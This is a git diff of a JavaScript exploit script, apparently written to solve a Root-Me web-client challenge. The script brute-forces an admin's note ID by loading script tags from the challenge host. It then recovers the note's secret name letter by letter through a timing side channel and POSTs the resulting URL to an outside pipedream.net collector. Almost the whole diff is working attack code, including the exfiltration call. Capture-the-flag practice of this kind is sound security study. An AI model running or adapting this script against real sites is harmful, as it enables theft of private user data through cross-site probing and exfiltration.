@@ -18,51 +18,73 @@ function getKeyOfGreatestElement(dictionary) {
 
 let adminId = -1;
 
-function checkId(id) {
-    const script = document.createElement('script');
-    script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${id}`;
-    script.onload = () => {
-        adminId = id;
-    };
-    document.body.appendChild(script);
+async function checkId(id) {
+    return new Promise((resolve, reject) => {
+        
+        const script = document.createElement('script');
+        script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${id}`;
+        script.onload = () => {
+            adminId = id;
+            resolve();
+        };
+        script.onerror = reject;
+        document.body.appendChild(script);
+    })
 } 
 
-let noteName = "";
-let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn";
-for (let i = 0; i < 10001; i++) {
-    //retrieve admin id
-    checkId(id);
-
-    //find final name
-    if (adminId != -1) {
-        i = 10001;
-        while (noteName.length < 32) {
-            let times = {};
-            for (let j = 0; j < lowercase_letters.length; j++) {
-                const l = lowercase_letters[j];
-                
-                //fetch page
-                var script = document.createElement('script');
-                script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${adminId}/${noteName}`;
-                document.body.appendChild(script);
-                
-                // Start the clock
-                var start = performance.now();
-                
-                // When script loads, caculate the time it took to finish the request
-                script.onload = () => {
-                    var time = performance.now() - start;
-                    times[l] = time;
-                }
-            }
-            noteName += getKeyOfGreatestElement(times);
+async function attack() {
+    let noteName = "";
+    let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn";
+    for (let i = 0; i < 10001; i++) {
+        //retrieve admin id
+        try {
+            await checkId(i);
+            console.log("admin id = " + adminId)  
+        } catch (error) {
+            continue;
         }
-
-        //retrieve final name 
-        let xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
-        xhr.send(`url=https://web-client-ch56.challenge01.root-me.org:58056/notes/${adminId}/${noteName}`);
-    }
     
+        //find final name
+        if (adminId != -1) {
+            i = 10001;
+            while (noteName.length < 32) {
+                let times = {};
+                for (let j = 0; j < lowercase_letters.length; j++) {
+                    const l = lowercase_letters[j];
+                    
+                    try {
+                        await new Promise((resolve, reject) => {
+                            //fetch page
+                            var script = document.createElement('script');
+                            script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${adminId}/${noteName + l}`;
+                            document.body.appendChild(script);
+                            // Start the clock
+                            var start = performance.now();
+                            
+                            // When script loads, caculate the time it took to finish the request
+                            script.onload = () => {
+                                var time = performance.now() - start;
+                                times[l] = time;
+                                resolve();
+                            }
+                        })
+                        
+                    } catch (error) {
+                        console.log("Error on script")
+                    }
+                    
+                }
+                noteName += getKeyOfGreatestElement(times);
+                console.log("name= " + noteName);
+            }
+    
+            //retrieve final name 
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
+            xhr.send("url=" + encodeURIComponent(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${adminId}/${noteName}`));
+        }
+        
+    }
 }
+attack();
 </script>
